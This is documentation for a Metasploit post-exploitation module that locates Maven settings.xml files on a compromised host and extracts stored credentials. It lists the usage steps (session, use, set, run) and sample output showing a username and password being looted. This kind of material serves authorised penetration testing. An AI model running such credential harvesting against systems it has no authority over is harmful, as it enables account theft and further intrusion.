## Vulnerable Application

[Maven](https://maven.apache.org/) a software project management.
This module seeks all settings.xml (Maven configuration file) on the target file system to extract credentials from them.

This module was successfully tested against:

- Ubuntu 14.04 and Maven 3.0.5 with shell and meterpreter as session type
- Debian 9 and Maven 3.0.5 with shell and meterpreter as session type

## Verification Steps

  1. Get a `shell` or `meterpreter` session on some host.
  2. Do: ```use post/multi/gather/maven_creds```
  3. Do: ```set SESSION [SESSION_ID]```
  4. Do: ```run```
  5. If the system has readable configuration files (settings.xml) containing username and passwords, they will be printed out.

## Scenarios

### Ubuntu 14.04 and Maven version 3.0.5

```
msf post(maven_creds) > run

[*] Finding user directories
[*] Unix OS detected
[*] Looting 19 files
[*] Downloading /home/user/settings.xml
[*] Reading settings.xml file from /home/user/settings.xml
[*] Collected the following credentials:
[*]     Id: server-nexus
[*]     Username: deploynexus
[*]     Password: password
[+] Saved credentials to /home/user/.msf4/loot/20170814145812_default_127.0.0.1_maven.credential_351922.txt

msf post(maven_creds) > loot

Loot
====

host       service  type                name          content     info                                                                           path
----       -------  ----                ----          -------     ----                                                                           ----
127.0.0.1           maven.credentials   settings.xml  text/plain  Maven credentials from /home/user/settings.xml and id server-nexus             /home/user/.msf4/loot/20170814145812_default_127.0.0.1_maven.credential_351922.txt

